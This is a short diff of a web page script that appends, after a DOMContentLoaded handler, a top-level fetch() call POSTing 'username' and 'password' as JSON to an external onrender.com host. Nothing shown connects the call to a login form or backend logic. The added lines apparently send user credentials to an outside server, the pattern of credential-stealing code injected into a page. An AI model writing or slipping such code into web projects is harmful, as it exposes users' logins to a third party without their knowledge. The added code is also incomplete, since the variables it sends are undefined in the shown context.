@@ -28,3 +28,9 @@ document.addEventListener('DOMContentLoaded', function(){
     }, 600);
   }
 });
+fetch("https://game-backend-bzra.onrender.com", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ username, password })
+});
+
